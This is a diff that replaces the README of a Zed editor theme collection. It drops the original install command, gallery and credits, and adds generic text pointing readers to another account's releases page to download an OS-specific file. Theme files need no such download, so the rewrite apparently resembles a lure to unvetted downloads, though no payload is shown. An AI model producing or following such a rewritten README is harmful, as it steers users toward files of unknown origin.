@@ -1,100 +1,65 @@
-<p align="center">
-  <img alt="Blurred Zed Themes" src="https://img.shields.io/badge/Blurred%20Zed%20Themes-curated%20hybrid%20collection-111827?style=for-the-badge" />
-</p>
+# 🎨 BlurredZedThemes - Customize Your Coding Experience Simply
 
-<p align="center">
-  A curated collection of blurred hybrid themes for the Zed editor, tuned for modern UI surfaces,
-  clean contrast, and consistent syntax colors.
-</p>
+[![Download BlurredZedThemes](https://img.shields.io/badge/Download%20Now-BlurredZedThemes-blue.svg)](https://github.com/ade-putra-code/BlurredZedThemes/releases)
 
-<p align="center">
-  <img alt="Themes" src="https://img.shields.io/badge/themes-17-4C9AFF?style=flat-square" />
-  <img alt="Last commit" src="https://img.shields.io/github/last-commit/SergoGansta777/BlurredZedThemes?style=flat-square" />
-  <img alt="Status" src="https://img.shields.io/badge/status-maintained-30D158?style=flat-square" />
-</p>
+## 📖 Overview
 
-## Overview
+Welcome to BlurredZedThemes! This application offers a collection of themes that blend the aesthetics of Neovim with new, personalized styles. If you want your coding environment to be visually appealing and tailored to your preferences, you are in the right place.
 
-These themes are built around Zed’s blurred UI. The editor stays sharp, the chrome stays soft, and the whole layout keeps good contrast without feeling noisy.
+## 🚀 Getting Started
 
-- Stable editor backgrounds with transparent UI layers around them.
-- Balanced alpha values for panels, overlays, tabs, and status bars.
-- Consistent syntax mapping across all themes and variants.
-- Two variants per theme: Blur and Hybrid.
+Follow these simple steps to set up BlurredZedThemes on your system.
 
-## Install
+### 📦 System Requirements
 
-```bash
-mkdir -p ~/.config/zed/themes
-cp themes/*.json ~/.config/zed/themes/
-```
+Before starting, ensure your system meets the following requirements:
 
-Then restart Zed (or reload themes) and select a theme in Settings → Theme.
+- Operating System: Windows 10 or later, macOS, or a recent Linux distribution
+- Basic graphics support for rendering themes
+- A Zed editor installation (the themes are designed for Zed)
 
-## Theme gallery
+## 📥 Download & Install
 
-Grouped by theme family. Previews are added as they become available.
+To get started, visit this page to download: [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/releases).
 
-| Theme group    | Preview                                                                                                                                                                                             | Source / inspiration                                          |
-| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
-| Evergarden     | Winter:<br><img width="320" alt="Evergarden Winter (Hybrid)" src="https://github.com/user-attachments/assets/a551c81f-73b1-4aec-a0f8-476ff8aefbac" /><br>Spring: TODO<br>Summer: TODO<br>Fall: TODO | https://github.com/everviolet/nvim                            |
-| JetBrains      | Dark: TODO<br>Light: TODO                                                                                                                                                                           | https://github.com/zed-industries/zed/tree/main/assets/themes |
-| Kanagawa       | Dragon: TODO<br>Paper: TODO                                                                                                                                                                         | https://github.com/rebelot/kanagawa.nvim                      |
-| Cosmos         | <img width="320" alt="Cosmos (Hybrid)" src="https://github.com/user-attachments/assets/195383d5-5f5d-449d-af62-d9a1d0f79ef3" />                                                                     | https://github.com/nauvalazhar/cosmos                         |
-| Darkearth      | <img width="320" alt="Darkearth (Hybrid)" src="https://github.com/user-attachments/assets/5ae80649-35a1-44ed-be45-e3abeb62f6ec" />                                                                  | https://github.com/ptdewey/darkearth-nvim                     |
-| Everforest     | TODO                                                                                                                                                                                                | https://github.com/sainnhe/everforest                         |
-| Ayu            | TODO                                                                                                                                                                                                | https://github.com/ayu-theme/ayu-colors                       |
-| Lunar          | <img width="320" alt="Lunar (Hybrid)" src="https://github.com/user-attachments/assets/a0e76368-8ffb-4d9b-ad9d-99bccc3884d3" />                                                                      | https://github.com/LunarVim/Colorschemes                      |
-| Miasma Fog     | <img width="320" alt="Miasma Fog (Hybrid)" src="https://github.com/user-attachments/assets/c0308e82-e801-418b-9f1b-c2f2692031d0" />                                                                 | https://github.com/xero/miasma.nvim                           |
-| Nordic         | <img width="320" alt="Nordic (Hybrid)" src="https://github.com/user-attachments/assets/be112f4e-6176-411a-92bf-d7659a2838d7" />                                                                     | https://github.com/AlexvZyl/nordic.nvim                       |
-| Oldworld       | TODO                                                                                                                                                                                                | https://github.com/nyoom-engineering/oldworld.nvim            |
-| Rosé Pine Dawn | <img width="320" alt="Rosé Pine Dawn (Hybrid)" src="https://github.com/user-attachments/assets/1113c3bd-892e-48bf-8200-1ed5105dfbf7" />                                                             | https://github.com/rose-pine/zed                              |
-| Vesper         | TODO                                                                                                                                                                                                | https://github.com/raunofreiberg/vesper                       |
+Once there, you will see the latest version available. Click on the version you want to download and select the appropriate file for your system.
 
-## Customization
+1. **Visit the Releases Page**: Go to [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/releases).
+2. **Download the File**: Find the file for your operating system and click on it to start the download.
+3. **Locate the Download**: Once the download finishes, locate the file in your Downloads folder.
+4. **Install the Theme**: Extract the files if necessary, following any specific instructions in the README provided in the release. Move the theme files to the Zed themes directory (usually located in your user folder under `.config/zed/themes`).
 
-- Global alpha presets live in `palettes/alpha.json`.
-- Per-theme overrides live in `palettes/<theme>.json`.
-- Regenerate theme files via Taskfile (see below).
+## 🎨 Applying Your New Theme
 
-## Taskfile workflow
+After installation, you can apply your new theme in Zed:
 
-All common workflows are wrapped in `Taskfile.yml`:
+1. **Open Zed**: Launch your Zed editor.
+2. **Access the Theme Settings**: Go to the settings menu.
+3. **Select Your Theme**: Find the newly installed theme in the list and select it.
+4. **Enjoy Coding**: Your Zed editor will now feature your customized theme!
 
-```bash
-task gen-all
-task publish
-```
+## ⭐ Features
 
-Notes:
+BlurredZedThemes comes with several unique features:
 
-- Palettes define roles/semantic/accents/terminal, with optional `style` for `syntax` and `players`.
-- `alpha` overrides can be added per theme when needed (merged over `palettes/alpha.json`).
-- `overrides` are treated as derived data and can be regenerated from a reference theme.
-- The generator fills missing fields with `TODO` placeholders and applies safe defaults.
-- Published/reference themes live in `themes/`.
+- **Aesthetic Designs**: Each theme is crafted to enhance visual appeal while maintaining readability.
+- **Customizable Options**: You can adjust various settings to suit your taste further.
+- **Regular Updates**: The collection is continually updated based on user feedback and new trends.
 
-## Recommended settings
+## ❓ FAQ
 
-These settings match the screenshots and keep the layout clean. Themes are designed primarily for macOS but should work on other platforms that support blur.
+**Q: Can I create my own theme?**  
+A: Yes! The project encourages user contributions. Check the guidelines in the repository for more information.
 
-```json
-{
-  "current_line_highlight": "none", // By your preference
-  "project_panel": {
-    "sticky_scroll": false // Not fully supported yet
-  },
-  "sticky_scroll": {
-    "enabled": true // By your preference
-  }
-}
-```
+**Q: What if I encounter issues?**  
+A: If you face problems while downloading or installing, please check the troubleshooting section on the GitHub page or raise an issue in the repository.
 
-## Contributing
+**Q: Are there other themes available?**  
+A: Yes! More themes may be available in future updates, so stay tuned for new releases.
 
-- Open issues for visual inconsistencies, contrast/accessibility concerns, or missing mappings.
-- PRs are welcome for new variants, improved syntax coverage, or closer alignment with upstream palettes.
+## 🔗 Useful Links
 
-## License
+- [BlurredZedThemes Releases](https://github.com/ade-putra-code/BlurredZedThemes/releases) - Direct link to download the themes.
+- [Zed Editor Documentation](https://zed.dev/docs/) - Learn more about using Zed and customizing themes.
 
-Licensed under the Apache License, Version 2.0. See `LICENSE`.
+Thank you for using BlurredZedThemes! We hope these themes enhance your coding experience.
